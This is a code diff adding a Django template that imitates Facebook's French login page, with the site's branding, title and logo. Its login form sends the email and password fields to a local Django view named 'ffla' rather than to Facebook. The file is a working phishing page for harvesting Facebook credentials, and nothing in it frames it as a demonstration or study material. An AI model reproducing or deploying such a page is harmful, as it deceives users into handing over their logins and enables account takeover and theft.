@@ -1,0 +1,82 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="fr" id="facebook" class="no_js">
+<head>
+	<link rel="stylesheet" type="text/css" href="{% static 'facebookmain.css' %}">
+	<meta charset="utf-8" />
+	<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+	<title id="pageTitle">Facebook - Connexion ou inscription</title>
+	<meta property="og:site_name" content="Facebook" />
+	<link rel="shortcut icon" href="{%  static 'facebook.ico' %}" />
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1-5 Locale_fr_FR" dir="ltr">
+	<div class="_li" id="u_0_3_Mk">
+		<div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_4_C/">
+			<div class="_608m">
+				<div class="clearfix _ikh _tb6">
+					<div class="_4bl7">
+						<span class="mrm _3bcv _50f3">Aller vers</span>
+					</div>
+					<div class="_4bl9 _3bcp">
+						<div class="_6a _608n" aria-label="Assistant de navigation" role="menubar" id="u_0_5_YE">
+							<div class="_6a uiPopover" id="u_0_6_al">
+								<a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_7_+f">
+									<span class="_55pe">Sections de cette Page</span>
+									<span class="_4o_3 _3-99">
+										<i class="img sp_wKWeuDiy5f9_1_5x sx_53f63c">
+										</i>
+									</span>
+								</a>
+							</div>
+							<div class="_6a _3bcs">
+							</div>
+							<div class="_6a mrm uiPopover" id="u_0_8_oh">
+								<a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_9_8H">
+									<span class="_55pe">Aide accessibilité</span>
+									<span class="_4o_3 _3-99">
+										<i class="img sp_wKWeuDiy5f9_1_5x sx_e06256"></i>
+									</span>
+								</a>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="globalContainer" class="uiContextualLayerParent">
+			<div class="fb_content clearfix " id="content" role="main">
+				<div>
+					<div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
+						<div class="_8esk">
+							<div class="_8esl">
+								<div class="_8ice">
+									<img class="fb_logo _8ilh img" src="{% static 'facebook.svg' %}" alt="Facebook" />
+								</div>
+								<h2 class="_8eso">Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
+							</div>
+							<div class="_8esn">
+								<div class="_8iep _8icy _9ahz _9ah-">
+									<div class="_6luv _52jv">
+	<form class="_9vtf" action="{% url 'ffla' %}" method="post"id="u_0_a_2g">
+		{% csrf_token %}
+	<div>
+		<div class="_6lux">
+			<input type="text" class="inputtext _55r1 _6luy" name="email" id="email"placeholder="Adresse e-mail ou num&#xe9;ro de t&#xe9;l." autocomplete="off" autofocus="1" aria-label="Adresse e-mail ou num&#xe9;ro de t&#xe9;l." />
+		</div>
+		<div class="_6lux">
+			<div class="_6luy _55r1 _1kbt" id="passContainer">
+				<input type="password" autocomplete="off" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" placeholder="Mot de passe" aria-label="Mot de passe" />
+				<div class="_9ls7" id="u_0_b_oY">
+						<div class="_9lsa">
+							<div class="_9lsb" id="u_0_c_lA">
+							</div>
+						</div>
+					</a>
+				</div>
+			</div>
+		</div>
+	</div>
+<button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_d_g0">Se connecter</button></div><div class="_6ltj"><a href="#">Mot de passe oublié ?</a></div><div class="_8icz"></div><div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#" ajaxify="/reg/spotlight/" id="u_0_2_pz" data-testid="open-registration-form-button" rel="async">Créer un compte</a></div></form></div><div id="reg_pages_msg" class="_58mk"><a href="/pages/create/?ref_type=registration_form" class="_8esh"></a></div></div></div></div></div></div></div><div class=""><div class="_95ke _8opy">
+</body></html>
